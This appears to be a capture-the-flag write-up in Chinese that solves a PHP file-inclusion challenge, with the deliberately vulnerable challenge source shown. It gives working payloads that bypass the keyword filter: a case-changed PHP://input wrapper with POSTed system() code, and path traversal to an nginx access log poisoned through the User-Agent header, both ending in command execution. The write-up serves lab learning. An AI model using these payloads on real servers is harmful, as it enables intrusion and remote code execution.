```
 <?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-16 11:26:29
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    include($file);
}else{
    highlight_file(__FILE__);
} 
```

过滤了php

过滤了data







### 第一种

大小写绕过

GET传入

```
?file=PHP://input
```

POST传入

```
<?php system("ls");?>
```

![image-20250405155627146](./assets/image-20250405155627146.png)

读取fl0g.php

GET

```
?file=PHP://input
```

POST

```
<?php system("tac fl0g.php");?>
```

![image-20250405155654787](./assets/image-20250405155654787.png)





### 第二种

日志注入

读取日志文件

```
?file=../../../../../../../var/log/nginx/access.log
```

![image-20250405155726367](./assets/image-20250405155726367.png)

抓包修改UA

![image-20250405155815903](./assets/image-20250405155815903.png)

![image-20250405155827200](./assets/image-20250405155827200.png)



成功写入

GET

```
?file=../../../../../../../var/log/nginx/access.log
```

POST

```
a=system("ls");
```

![image-20250405155854503](./assets/image-20250405155854503.png)

命令执行成功